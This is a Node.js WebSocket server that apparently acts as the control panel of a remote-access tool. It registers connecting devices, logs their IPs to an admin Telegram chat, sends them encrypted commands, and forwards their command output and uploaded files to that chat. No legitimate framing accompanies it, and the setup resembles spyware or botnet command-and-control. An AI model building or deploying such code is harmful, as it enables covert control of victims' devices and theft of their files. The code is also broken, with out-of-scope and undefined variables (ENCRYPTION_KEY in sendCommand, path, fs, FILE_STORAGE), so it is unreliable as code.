const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const { encryptData, decryptData } = require('./utils');

// Store connected clients
const clients = new Map();
const commandQueue = new Map();

module.exports.setupWSConnection = (server, bot) => {
  const wss = new WebSocket.Server({ server });
  const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');

  wss.on('connection', (ws, req) => {
    const deviceId = uuidv4();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    clients.set(deviceId, {
      ws,
      ip,
      device: {},
      lastSeen: Date.now(),
      lastPing: Date.now()
    });
    
    // Notify admin
    bot.sendMessage(process.env.ADMIN_CHAT_ID, 
      `📱 New device connected!\n\n` +
      `🔑 ID: ${deviceId}\n` +
      `🌐 IP: ${ip}\n` +
      `🕒 Time: ${new Date().toLocaleString()}`
    );
    
    ws.on('message', (message) => {
      try {
        const data = decryptData(message.toString(), ENCRYPTION_KEY);
        handleDeviceMessage(deviceId, data);
      } catch (e) {
        console.error('Decryption error:', e);
      }
    });
    
    ws.on('close', () => {
      clients.delete(deviceId);
      bot.sendMessage(process.env.ADMIN_CHAT_ID, 
        `📴 Device disconnected!\n\n` +
        `🔑 ID: ${deviceId}\n` +
        `🕒 Time: ${new Date().toLocaleString()}`
      );
    });
  });
  
  // Handle device messages
  const handleDeviceMessage = (deviceId, data) => {
    const client = clients.get(deviceId);
    if (!client) return;
    
    client.lastSeen = Date.now();
    
    switch (data.type) {
      case 'pong':
        client.lastPing = Date.now();
        break;
        
      case 'device_info':
        client.device = data.info;
        break;
        
      case 'command_result':
        handleCommandResult(deviceId, data);
        break;
        
      case 'file':
        handleFileUpload(deviceId, data);
        break;
        
      default:
        console.log('Unknown message type:', data.type);
    }
  };
  
  // Handle command results
  const handleCommandResult = (deviceId, data) => {
    const command = commandQueue.get(data.commandId);
    if (!command) return;
    
    commandQueue.delete(data.commandId);
    
    if (data.success) {
      bot.sendMessage(process.env.ADMIN_CHAT_ID, 
        `✅ Command ${data.commandId} executed\n` +
        `📝 Result: ${data.result.substr(0, 1000)}`);
    } else {
      bot.sendMessage(process.env.ADMIN_CHAT_ID, 
        `❌ Command ${data.commandId} failed\n` +
        `💥 Error: ${data.error}`);
    }
  };
  
  // Handle file uploads
  const handleFileUpload = (deviceId, data) => {
    const fileId = Date.now() + '-' + Math.round(Math.random() * 1E9);
    const filePath = path.join(FILE_STORAGE, fileId);
    
    fs.writeFile(filePath, Buffer.from(data.content, 'base64'), (err) => {
      if (err) return console.error('File save error:', err);
      
      bot.sendDocument(process.env.ADMIN_CHAT_ID, filePath, {
        caption: `📁 File from device ${deviceId}\n` +
                 `📂 Filename: ${data.filename}`
      }).then(() => {
        fs.unlink(filePath, () => {});
      });
    });
  };
  
  // Ping clients periodically
  setInterval(() => {
    clients.forEach((client, deviceId) => {
      if (Date.now() - client.lastPing > 30000) {
        client.ws.close();
        clients.delete(deviceId);
        return;
      }
      
      try {
        client.ws.send(encryptData({ type: 'ping' }, ENCRYPTION_KEY));
      } catch (e) {
        console.error('Ping error:', e);
      }
    });
  }, 15000);
};

// Send command to device
module.exports.sendCommand = (deviceId, command) => {
  const client = clients.get(deviceId);
  if (!client) return null;
  
  const commandId = uuidv4().substr(0, 8);
  commandQueue.set(commandId, { deviceId, command });
  
  try {
    client.ws.send(encryptData({
      type: 'command',
      id: commandId,
      payload: command
    }, ENCRYPTION_KEY));
    return commandId;
  } catch (e) {
    console.error('Send command error:', e);
    return null;
  }
};

module.exports.clients = clients;